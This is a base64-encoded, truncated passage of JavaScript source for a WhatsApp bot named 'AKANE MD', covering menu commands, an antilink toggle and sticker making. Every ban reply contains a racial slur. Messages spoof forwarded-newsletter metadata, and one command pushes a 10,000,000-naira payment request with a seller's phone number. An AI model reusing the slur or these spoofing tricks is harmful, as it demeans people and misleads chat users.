Igg4oCiIPCdl5XwnZeo8J2XmvCdl6DwnZeY8J2XofCdl6gKIOKVsOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgQpgOwpyaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgewogICAgaW1hZ2U6IHsgdXJsOiAiaHR0cHM6Ly9maWxlcy5jYXRib3gubW9lL21oMTB4OC5qcGciIH0sCiAgICBjYXB0aW9uLAogICAgbWVudGlvbnM6IFttLnNlbmRlcl0sCiAgICBmb290ZXI6IGdsb2JhbC5ib3ROYW1lLAogICAgYnV0dG9uczogWwogICAgICB7CiAgICAgICAgYnV0dG9uSWQ6ICJtZW51YWxsIiwKICAgICAgICBidXR0b25UZXh0OiB7IGRpc3BsYXlUZXh0OiAiQUxMTUVOVc2eIiB9CiAgICAgIH0sCiAgICAgIHsKICAgICAgICBidXR0b25JZDogIlJpY2hpZSIsCiAgICAgICAgYnV0dG9uVGV4dDogeyBkaXNwbGF5VGV4dDogIktJTkciIH0KICAgICAgfQogICAgXSwKICAgIHZpZXdPbmNlOiB0cnVlLAogICAgaGVhZGVyVHlwZTogNiwKICAgIHF1b3RlZDogbSwKICAgIGNvbnRleHRJbmZvOiB7CiAgICAgIGlzRm9yd2FyZGVkOiB0cnVlLAogICAgICBmb3J3YXJkaW5nU2NvcmU6IDk5OTk5LAogICAgICBmb3J3YXJkZWROZXdzbGV0dGVyTWVzc2FnZUluZm86IHsKICAgICAgICBuZXdzbGV0dGVySmlkOiBgMTIwMzYzMzYyNjEwMDI2MDUyQG5ld3NsZXR0ZXJgLAogICAgICAgIG5ld3NsZXR0ZXJOYW1lOiBgQUtBTkUgTURgCiAgICAgIH0KICAgIH0KfSk7Cgp9CmJyZWFrOwpjYXNlICJha2FuZSI6CmNhc2UnbWVudSc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmNvbnN0IHBwVXJsID0gYXdhaXQgcmljaC5wcm9maWxlUGljdHVyZVVybChyaWNoLnVzZXIuaWQsICdpbWFnZScpCnJlcGx5Z2MobWVzcy53YWl0KQphd2FpdCBzbGVlcCgxMDAwKTsKbGV0IHJpY2hNZW51ID0gYArip44gypzhtIfKn8qf4bSPICR7bS5wdXNoTmFtZX0K4qeOIMqZ4bSP4bSbIMm04bSA4bSN4bSHIOOAjCR7Ym90bmFtZX3jgI0K4qeOIHPhtJvhtIDhtJvhtJxzIDogYWN0aXZlIArip44gyoDhtJzJtOG0m8mq4bSN4bSHICR7cnVudGltZShwcm9jZXNzLnVwdGltZSgpKX0K4qeOIOG0j+G0ocm04bSHyoAgJHtvd25lcm5hbWV9CuKnjiDhtKDhtIfKgHPJquG0j8m0IHYuMS4xCipIZWxsbyogQCR7bT8uc2VuZGVyLnNwbGl0KCdAJylbMF19IOKImiBcYFRISVMgSVMgQUtBTkUgTURcYApcYEhPVyBNQVkgSSBBU1NJU1QgWU9VIPCfgIRcYArinqLilIHilIHilIHilIHilIHimJjvuI7ilIHilIHilIHilIHilIHilIHinqIKIPCfgIQg4oCiIPCdl6DwnZeY8J2XofCdl6jwnZeU8J2Xn/Cdl58KIPCfmIcg4oCiIPCdl5fwnZei8J2XqvCdl6HwnZef8J2XovCdl5TwnZeX8J2XoPCdl5jwnZeh8J2XqAog8J+MnyDigKIg8J2XovCdl6rwnZeh8J2XmPCdl6XwnZeg8J2XmPCdl6HwnZeoCiDwn5G7IOKAoiDwnZeZ8J2XqPCdl6HwnZeg8J2XmPCdl6HwnZeoCiDwn5i7IOKAoiDwnZeU8J2XofCdl5zwnZeg8J2XmPCdl6DwnZeY8J2XofCdl6gKIPCflrzvuI8g4oCiICpFUEhPVE9NRU5VKgog8J+OqSDigKIg8J2XovCdl6fwnZeb8J2XmPCdl6XwnZeg8J2XmPCdl6HwnZeoCiDim5HvuI8g4oCiIPCdl5rwnZel8J2XovCdl6jwnZej8J2XoPCdl5jwnZeh8J2XqAog8J+YiCDigKIg8J2XlfCdl6jwnZea8J2XoPCdl5jwnZeh8J2XqAog4pWw4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSBCmA7CgpyaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyBjYXB0aW9uOiByaWNoTWVudSwgaW1hZ2U6IHsgdXJsOiBwcFVybCB9IH0sIHsgcXVvdGVkOiBtIH0pOwovLyJodHRwczovL2gudG9wNHRvcC5pby9wXzMzNTkweTFkazIuanBnIgphd2FpdCBzbGVlcCgyMDAwKQoKYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKCmF1ZGlvOiByaWNoaWVwbGF5LAoKbWltZXR5cGU6ICdhdWRpby9tcGVnJwoKfSwgeyBxdW90ZWQ6IG0KCn0pCgoKfQpicmVhazsKY2FzZSAibWVudTIiOnsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CnJlcGx5Z2MobWVzcy53YWl0KQphd2FpdCBzbGVlcCgxMDAwKTsKY29uc3QgdGVrID0gYArip44gypzhtIfKn8qf4bSPICR7bS5wdXNoTmFtZX0K4qeOIMqZ4bSP4bSbIMm04bSA4bSN4bSHIOOAjCR7Ym90bmFtZX3jgI0K4qeOIHPhtJvhtIDhtJvhtJxzIDogYWN0aXZlIArip44gyoDhtJzJtOG0m8mq4bSN4bSHICR7cnVudGltZShwcm9jZXNzLnVwdGltZSgpKX0K4qeOIOG0j+G0ocm04bSHyoAgJHtvd25lcm5hbWV9CuKnjiDhtKDhtIfKgHPJquG0j8m0IHYuMS4xCipIZWxsbyogQCR7bT8uc2VuZGVyLnNwbGl0KCdAJylbMF19IOKImiBcYFRISVMgSVMgQUtBTkUgTURcYApcYEhPVyBNQVkgSSBBU1NJU1QgWU9VIPCfgIRcYArinqLilIHilIHilIHilIHilIHimJjvuI7ilIHilIHilIHilIHilIHilIHinqIKIPCfgIQg4oCiIPCdl6DwnZeY8J2XofCdl6jwnZeU8J2Xn/Cdl58KIPCfmIcg4oCiIPCdl5fwnZei8J2XqvCdl6HwnZef8J2XovCdl5TwnZeX8J2XoPCdl5jwnZeh8J2XqAog8J+MnyDigKIg8J2XovCdl6rwnZeh8J2XmPCdl6XwnZeg8J2XmPCdl6HwnZeoCiDwn5G7IOKAoiDwnZeZ8J2XqPCdl6HwnZeg8J2XmPCdl6HwnZeoCiDwn5i7IOKAoiDwnZeU8J2XofCdl5zwnZeg8J2XmPCdl6DwnZeY8J2XofCdl6gKIPCflrzvuI8g4oCiICpFUEhPVE9NRU5VKgog8J+OqSDigKIg8J2XovCdl6fwnZeb8J2XmPCdl6XwnZeg8J2XmPCdl6HwnZeoCiDim5HvuI8g4oCiIPCdl5rwnZel8J2XovCdl6jwnZej8J2XoPCdl5jwnZeh8J2XqAog8J+YiCDigKIg8J2XlfCdl6jwnZea8J2XoPCdl5jwnZeh8J2XqAog4pWw4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSBCmAKcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKdGV4dDogdGVrLApjb250ZXh0SW5mbzogewpleHRlcm5hbEFkUmVwbHk6IHsgIAp0aXRsZTogYm90bmFtZSwKYm9keTogYCR7Ym90bmFtZX1gLAp0aHVtYm5haWxVcmw6IGdsb2JhbC50aHVtYm5haWwsCnNvdXJjZVVybDogd2FnYywKbWVkaWFUeXBlOiAxLApyZW5kZXJMYXJnZXJUaHVtYm5haWw6IHRydWUKfX19LCB7IHF1b3RlZDogbX0pCiAgICAgICBhd2FpdCBzbGVlcCgyMDAwKQoKYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKCmF1ZGlvOiByaWNoaWVwbGF5LAoKbWltZXR5cGU6ICdhdWRpby9tcGVnJwoKfSwgeyBxdW90ZWQ6IG0KCn0pCgoKfQpicmVhazsKY2FzZSAnYW50aWxpbmsnOiB7CiAgICBpZiAoIW0uaXNHcm91cCkgcmV0dXJuIHJlcGx5KCJUaGlzIGNvbW1hbmQgb25seSB3b3JrcyBpbiBncm91cCBjaGF0cy4iKTsKICAgIGlmICghaXNBZG1pbnMpIHJldHVybiByZXBseSgiT25seSBncm91cCBhZG1pbnMgY2FuIHVzZSB0aGlzIGNvbW1hbmQuIik7CiAgICBpZiAoIWFyZ3NbMF0pIHJldHVybiByZXBseSgiVXNlOiAuYW50aWxpbmsgb24gLyBvZmYiKTsKCiAgICBjb25zdCBzdGF0dXMgPSBhcmdzWzBdLnRvTG93ZXJDYXNlKCk7CgogICAgaWYgKHN0YXR1cyA9PT0gJ29uJykgewogICAgICAgIGdsb2JhbC5fYW50aWxpbmtbbS5jaGF0XSA9IHRydWU7CiAgICAgICAgcmV0dXJuIHJlcGx5KCJBbnRpbGluayBpcyBub3cgKmVuYWJsZWQqIGluIHRoaXMgZ3JvdXAuIik7CiAgICB9IGVsc2UgaWYgKHN0YXR1cyA9PT0gJ29mZicpIHsKICAgICAgICBnbG9iYWwuX2FudGlsaW5rW20uY2hhdF0gPSBmYWxzZTsKICAgICAgICByZXR1cm4gcmVwbHkoIkFudGlsaW5rIGlzIG5vdyAqZGlzYWJsZWQqIGluIHRoaXMgZ3JvdXAuIik7CiAgICB9IGVsc2UgewogICAgICAgIHJldHVybiByZXBseSgiSW52YWxpZCBhcmd1bWVudC4gVXNlIG9uL29mZi4iKTsKICAgIH0KfQpicmVhazsKIAogY2FzZSAnbWVudWFsbCc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgbGV0IHRlayA9IGAke21lbnVhbGwocHJlZml4LCBoaXR1ZXQpfWAKYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKdGV4dDogdGVrLApjb250ZXh0SW5mbzogewpleHRlcm5hbEFkUmVwbHk6IHsgIAp0aXRsZTogYm90bmFtZSwKYm9keTogYCR7Ym90bmFtZX1gLAp0aHVtYm5haWxVcmw6IGdsb2JhbC50aHVtYm5haWwsCnNvdXJjZVVybDogd2FnYywKbWVkaWFUeXBlOiAxLApyZW5kZXJMYXJnZXJUaHVtYm5haWw6IHRydWUKfX19LCB7IHF1b3RlZDogbX0pCiAgICAgICBhd2FpdCBzbGVlcCgyMDAwKQoKYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKCmF1ZGlvOiByaWNoaWVwbGF5LAoKbWltZXR5cGU6ICdhdWRpby9tcGVnJwoKfSwgeyBxdW90ZWQ6IG0KCn0pCgoKfQpicmVhazsJCgpjYXNlICdncm91cG1lbnUnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogIGxldCB0ZWsgPSBgJHtncm91cG1lbnUocHJlZml4LCBoaXR1ZXQpfWAKYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKdGV4dDogdGVrLApjb250ZXh0SW5mbzogewpleHRlcm5hbEFkUmVwbHk6IHsgIAp0aXRsZTogYm90bmFtZSwKYm9keTogYCR7Ym90bmFtZX1gLAp0aHVtYm5haWxVcmw6IGdsb2JhbC50aHVtYm5haWwsCnNvdXJjZVVybDogd2FnYywKbWVkaWFUeXBlOiAxLApyZW5kZXJMYXJnZXJUaHVtYm5haWw6IHRydWUKfX19LCB7IHF1b3RlZDogbX0pCiAgICAgICBhd2FpdCBzbGVlcCgyMDAwKQoKYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKCmF1ZGlvOiByaWNoaWVwbGF5LAoKbWltZXR5cGU6ICdhdWRpby9tcGVnJwoKfSwgeyBxdW90ZWQ6IG0KCn0pCgoKfQpicmVhazsJCQpjYXNlICdidWdtZW51JzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICBsZXQgdGVrID0gYCR7YnVnbWVudShwcmVmaXgsIGhpdHVldCl9YAphd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgewp0ZXh0OiB0ZWssCmNvbnRleHRJbmZvOiB7CmV4dGVybmFsQWRSZXBseTogeyAgCnRpdGxlOiBib3RuYW1lLApib2R5OiBgJHtib3RuYW1lfWAsCnRodW1ibmFpbFVybDogZ2xvYmFsLnRodW1ibmFpbCwKc291cmNlVXJsOiB3YWdjLAptZWRpYVR5cGU6IDEsCnJlbmRlckxhcmdlclRodW1ibmFpbDogdHJ1ZQp9fX0sIHsgcXVvdGVkOiBtfSkKICAgICAgIGF3YWl0IHNsZWVwKDIwMDApCgphd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgewoKYXVkaW86IHJpY2hpZXBsYXksCgptaW1ldHlwZTogJ2F1ZGlvL21wZWcnCgp9LCB7IHF1b3RlZDogbQoKfSkKCgp9CmJyZWFrOwkJCmNhc2UgJ2Rvd25sb2FkbWVudSc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgbGV0IHRlayA9IGAke2Rvd25sb2FkbWVudShwcmVmaXgsIGhpdHVldCl9YAphd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgewp0ZXh0OiB0ZWssCmNvbnRleHRJbmZvOiB7CmV4dGVybmFsQWRSZXBseTogeyAgCnRpdGxlOiBib3RuYW1lLApib2R5OiBgJHtib3RuYW1lfWAsCnRodW1ibmFpbFVybDogZ2xvYmFsLnRodW1ibmFpbCwKc291cmNlVXJsOiB3YWdjLAptZWRpYVR5cGU6IDEsCnJlbmRlckxhcmdlclRodW1ibmFpbDogdHJ1ZQp9fX0sIHsgcXVvdGVkOiBtfSkKICAgICAgIGF3YWl0IHNsZWVwKDIwMDApCgphd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgewoKYXVkaW86IHJpY2hpZXBsYXksCgptaW1ldHlwZTogJ2F1ZGlvL21wZWcnCgp9LCB7IHF1b3RlZDogbQoKfSkKCgp9CmJyZWFrOwkKY2FzZSAnb3RoZXJtZW51JzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICBsZXQgdGVrID0gYCR7b3RoZXJtZW51KHByZWZpeCwgaGl0dWV0KX1gCmF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CnRleHQ6IHRlaywKY29udGV4dEluZm86IHsKZXh0ZXJuYWxBZFJlcGx5OiB7ICAKdGl0bGU6IGJvdG5hbWUsCmJvZHk6IGAke2JvdG5hbWV9YCwKdGh1bWJuYWlsVXJsOiBnbG9iYWwudGh1bWJuYWlsLApzb3VyY2VVcmw6IHdhZ2MsCm1lZGlhVHlwZTogMSwKcmVuZGVyTGFyZ2VyVGh1bWJuYWlsOiB0cnVlCn19fSwgeyBxdW90ZWQ6IG19KQogICAgICAgYXdhaXQgc2xlZXAoMjAwMCkKCmF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CgphdWRpbzogcmljaGllcGxheSwKCm1pbWV0eXBlOiAnYXVkaW8vbXBlZycKCn0sIHsgcXVvdGVkOiBtCgp9KQoKCn0KYnJlYWs7CQpjYXNlICdvd25lcm1lbnUnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogIGxldCB0ZWsgPSBgJHtvd25lcm1lbnUocHJlZml4LCBoaXR1ZXQpfWAKYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKdGV4dDogdGVrLApjb250ZXh0SW5mbzogewpleHRlcm5hbEFkUmVwbHk6IHsgIAp0aXRsZTogYm90bmFtZSwKYm9keTogYCR7Ym90bmFtZX1gLAp0aHVtYm5haWxVcmw6IGdsb2JhbC50aHVtYm5haWwsCnNvdXJjZVVybDogd2FnYywKbWVkaWFUeXBlOiAxLApyZW5kZXJMYXJnZXJUaHVtYm5haWw6IHRydWUKfX19LCB7IHF1b3RlZDogbX0pCiAgICAgICBhd2FpdCBzbGVlcCgyMDAwKQoKYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKCmF1ZGlvOiByaWNoaWVwbGF5LAoKbWltZXR5cGU6ICdhdWRpby9tcGVnJwoKfSwgeyBxdW90ZWQ6IG0KCn0pCgoKfQpicmVhazsJCmNhc2UgJ2Z1bm1lbnUnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogIGxldCB0ZWsgPSBgJHtmdW5tZW51KHByZWZpeCwgaGl0dWV0KX1gCmF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CnRleHQ6IHRlaywKY29udGV4dEluZm86IHsKZXh0ZXJuYWxBZFJlcGx5OiB7ICAKdGl0bGU6IGJvdG5hbWUsCmJvZHk6IGAke2JvdG5hbWV9YCwKdGh1bWJuYWlsVXJsOiBnbG9iYWwudGh1bWJuYWlsLApzb3VyY2VVcmw6IHdhZ2MsCm1lZGlhVHlwZTogMSwKcmVuZGVyTGFyZ2VyVGh1bWJuYWlsOiB0cnVlCn19fSwgeyBxdW90ZWQ6IG19KQogICAgICAgYXdhaXQgc2xlZXAoMjAwMCkKCmF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CgphdWRpbzogcmljaGllcGxheSwKCm1pbWV0eXBlOiAnYXVkaW8vbXBlZycKCn0sIHsgcXVvdGVkOiBtCgp9KQoKCn0KYnJlYWs7CmNhc2UgJ3N0aWNrZXJtZW51JzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICBsZXQgdGVrID0gYCR7c3RpY2tlcm1lbnUocHJlZml4LCBoaXR1ZXQpfWAKYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKdGV4dDogdGVrLApjb250ZXh0SW5mbzogewpleHRlcm5hbEFkUmVwbHk6IHsgIAp0aXRsZTogYm90bmFtZSwKYm9keTogYCR7Ym90bmFtZX1gLAp0aHVtYm5haWxVcmw6IGdsb2JhbC50aHVtYm5haWwsCnNvdXJjZVVybDogd2FnYywKbWVkaWFUeXBlOiAxLApyZW5kZXJMYXJnZXJUaHVtYm5haWw6IHRydWUKfX19LCB7IHF1b3RlZDogbX0pCiAgICAgICBhd2FpdCBzbGVlcCgyMDAwKQoKYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKCmF1ZGlvOiByaWNoaWVwbGF5LAoKbWltZXR5cGU6ICdhdWRpby9tcGVnJwoKfSwgeyBxdW90ZWQ6IG0KCn0pCgoKfQpicmVhazsKY2FzZSAnZXBob3RvbWVudSc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgbGV0IHRlayA9IGAke2VwaG90b21lbnUocHJlZml4LCBoaXR1ZXQpfWAKYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKdGV4dDogdGVrLApjb250ZXh0SW5mbzogewpleHRlcm5hbEFkUmVwbHk6IHsgIAp0aXRsZTogYm90bmFtZSwKYm9keTogYCR7Ym90bmFtZX1gLAp0aHVtYm5haWxVcmw6IGdsb2JhbC50aHVtYm5haWwsCnNvdXJjZVVybDogd2FnYywKbWVkaWFUeXBlOiAxLApyZW5kZXJMYXJnZXJUaHVtYm5haWw6IHRydWUKfX19LCB7IHF1b3RlZDogbX0pCiAgICAgICBhd2FpdCBzbGVlcCgyMDAwKQoKYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKCmF1ZGlvOiByaWNoaWVwbGF5LAoKbWltZXR5cGU6ICdhdWRpby9tcGVnJwoKfSwgeyBxdW90ZWQ6IG0KCn0pCgoKfQpicmVhazsKY2FzZSAnYW5pbWVtZW51JzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICBsZXQgdGVrID0gYCR7YW5pbWVtZW51KHByZWZpeCwgaGl0dWV0KX1gCmF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CnRleHQ6IHRlaywKY29udGV4dEluZm86IHsKZXh0ZXJuYWxBZFJlcGx5OiB7ICAKdGl0bGU6IGJvdG5hbWUsCmJvZHk6IGAke2JvdG5hbWV9YCwKdGh1bWJuYWlsVXJsOiBnbG9iYWwudGh1bWJuYWlsLApzb3VyY2VVcmw6IHdhZ2MsCm1lZGlhVHlwZTogMSwKcmVuZGVyTGFyZ2VyVGh1bWJuYWlsOiB0cnVlCn19fSwgeyBxdW90ZWQ6IG19KQogICAgICAgYXdhaXQgc2xlZXAoMjAwMCkKCmF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CgphdWRpbzogcmljaGllcGxheSwKCm1pbWV0eXBlOiAnYXVkaW8vbXBlZycKCn0sIHsgcXVvdGVkOiBtCgp9KQoKCn0KYnJlYWs7CmNhc2UgIm1lbnV0eXBlIjogY2FzZSAidHlwZW1lbnUiOiB7IAppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICAgIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IAogICAgICAgIGZvb3RlcjogYMKpICR7Ym90bmFtZX1gLCAKICAgICAgICBidXR0b25zOiBbIAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgYnV0dG9uSWQ6ICdhY3Rpb24nLCAKICAgICAgICAgICAgICAgIGJ1dHRvblRleHQ6IHsgZGlzcGxheVRleHQ6ICdTRUxFQ1QgWU9VUiBERVNJUkVEIE1FTlUgVFlQRScgfSwgCiAgICAgICAgICAgICAgICB0eXBlOiA0LCAKICAgICAgICAgICAgICAgIG5hdGl2ZUZsb3dJbmZvOiB7IAogICAgICAgICAgICAgICAgICAgIG5hbWU6ICdzaW5nbGVfc2VsZWN0JywgCiAgICAgICAgICAgICAgICAgICAgcGFyYW1zSnNvbjogSlNPTi5zdHJpbmdpZnkoeyAKICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6ICdBS0FORS1NRCcsIAogICAgICAgICAgICAgICAgICAgICAgICBzZWN0aW9uczogWyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6ICdBdmFpbGFibGUgbWVudSBPcHRpb25zJywgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm93czogWyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyB0aXRsZTogJ01FTlVUWVBFIDHwn4CEJywgaWQ6ICcubWVudScgfSwgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgdGl0bGU6ICdNRU5VVFlQRSAy8J+AhCcsIGlkOiAnLm1lbnUyJyB9LCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyB0aXRsZTogJ01FTlVUWVBFIDPwn4CEJywgaWQ6ICcuYnV0dG9ubWVudScgfSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICAgICAgICAgXSAKICAgICAgICAgICAgICAgICAgICB9KSAKICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgIH0gCiAgICAgICAgXSwgCiAgICAgICAgaGVhZGVyVHlwZTogMSwgCiAgICAgICAgdmlld09uY2U6IHRydWUsIAogICAgICAgIGltYWdlOiB7IHVybDogZ2xvYmFsLnRodW1ibmFpbCB9LCAKICAgICAgICBjYXB0aW9uOiAiXG4qQ0hPT1NFKiIgCiAgICB9LCB7IHF1b3RlZDogbSB9KTsgCgogICAgYnJlYWs7IAp9CmNhc2UgJ25vZW5jJzoKY2FzZSAnYnV5c2NyaXB0JzogewpsZXQgYnV5ID0gYOKWpyDjgIwgKlNjcmlwdCAtIEFLQU5FIE1EKiDjgI0K4pSCCuKUgiDiiJggQnV5PyBubyBlbmMK4pSCIGNvbnRhY3QgcmljaGllIArilIIrNDQ3NzY4NTQwMzAwCuKVsOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgWAKcmljaC5yZWxheU1lc3NhZ2UobS5jaGF0LCB7CiAgICByZXF1ZXN0UGF5bWVudE1lc3NhZ2U6IHsKICAgICAgY3VycmVuY3lDb2RlSXNvNDIxNzogJ05BSVJBJywKICAgICAgYW1vdW50MTAwMDogMTAwMDAwMDAsCiAgICAgIHJlcXVlc3RGcm9tOiBtLnNlbmRlciwKICAgICAgbm90ZU1lc3NhZ2U6IHsKICAgICAgZXh0ZW5kZWRUZXh0TWVzc2FnZTogewogICAgICB0ZXh0OiBidXksCiAgICAgIGNvbnRleHRJbmZvOiB7CiAgICAgIGV4dGVybmFsQWRSZXBseTogewogICAgICBzaG93QWRBdHRyaWJ1dGlvbjogdHJ1ZQogICAgICB9fX19fX0sIHt9KQovKnF5dXVuZWUuc2VuZE1lc3NhZ2UobS5jaGF0LCB7IGRvY3VtZW50OiBmcy5yZWFkRmlsZVN5bmMoIi4vc3JjL1NDIHpheGlzIFY0LjAuemlwIiksIG1pbWV0eXBlOiAnYXBwbGljYXRpb24vemlwJywgZmlsZU5hbWU6ICdTQyB6YXhpcyBWNCd9LCB7IHF1b3RlZCA6IGtvaSB9KSovCn0KYnJlYWs7CmNhc2UgJ3N0aWNrZXInOiBjYXNlICdzJzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICBpZiAoIW0ucXVvdGVkKSByZXR1cm4gcmVwbHkoYFJlcGx5IEltYWdlIG9yIFZpZGVvIHdpdGggY29tbWFuZCAke3ByZWZpeCArIGNvbW1hbmR9YCk7CiAgCiAgaWYgKC9pbWFnZS8udGVzdChtaW1lKSkgewogICAgbGV0IG1lZGlhID0gYXdhaXQgcXVvdGVkLmRvd25sb2FkKCk7CiAgICBsZXQgZW5jbWVkaWEgPSBhd2FpdCByaWNoLnNlbmRJbWFnZUFzU3RpY2tlcihmcm9tLCBtZWRpYSwgbSwgeyBwYWNrbmFtZTogZ2xvYmFsLnBhY2tuYW1lLCBhdXRob3I6IGdsb2JhbC5hdXRob3IgfSk7CiAgICBhd2FpdCBmcy51bmxpbmtTeW5jKGVuY21lZGlhKTsKICB9IGVsc2UgaWYgKC92aWRlby8udGVzdChtaW1lKSkgewogICAgaWYgKChxdW90ZWQubXNnIHx8IHF1b3RlZCkuc2Vjb25kcyA+IDExKSByZXR1cm4gbS5yZXBseSgnbWF4IDEwcycpOwogICAgCiAgICBsZXQgbWVkaWEgPSBhd2FpdCBxdW90ZWQuZG93bmxvYWQoKTsKICAgIGxldCBlbmNtZWRpYSA9IGF3YWl0IHJpY2guc2VuZFZpZGVvQXNTdGlja2VyKGZyb20sIG1lZGlhLCBtLCB7IHBhY2tuYW1lOiBnbG9iYWwucGFja25hbWUsIGF1dGhvcjogZ2xvYmFsLmF1dGhvciB9KTsKICAgIGF3YWl0IGZzLnVubGlua1N5bmMoZW5jbWVkaWEpOwogIH0gZWxzZSB7CiAgICByZXR1cm4gcmVwbHkoYFNlbmQgSW1hZ2Ugb3IgVmlkZW8gd2l0aCBjb21tYW5kICR7cHJlZml4ICsgY29tbWFuZH1cbnZpZGVvIGR1cmF0aW9uIG9ubHkgMS05c2ApOwogIH0KfQpicmVhazsKY2FzZSAnZ2xpdGNodGV4dCc6CmNhc2UgJ3dyaXRldGV4dCc6CmNhc2UgJ2FkdmFuY2VkZ2xvdyc6CmNhc2UgJ3R5cG9ncmFwaHl0ZXh0JzoKY2FzZSAncGl4ZWxnbGl0Y2gnOgpjYXNlICduZW9uZ2xpdGNoJzoKY2FzZSAnZmxhZ3RleHQnOgpjYXNlICdmbGFnM2R0ZXh0JzoKY2FzZSAnZGVsZXRpbmd0ZXh0JzoKY2FzZSAnYmxhY2twaW5rc3R5bGUnOgpjYXNlICdnbG93aW5ndGV4dCc6CmNhc2UgJ3VuZGVyd2F0ZXJ0ZXh0JzoKY2FzZSAnbG9nb21ha2VyJzoKY2FzZSAnY2FydG9vbnN0eWxlJzoKY2FzZSAncGFwZXJjdXRzdHlsZSc6CmNhc2UgJ3dhdGVyY29sb3J0ZXh0J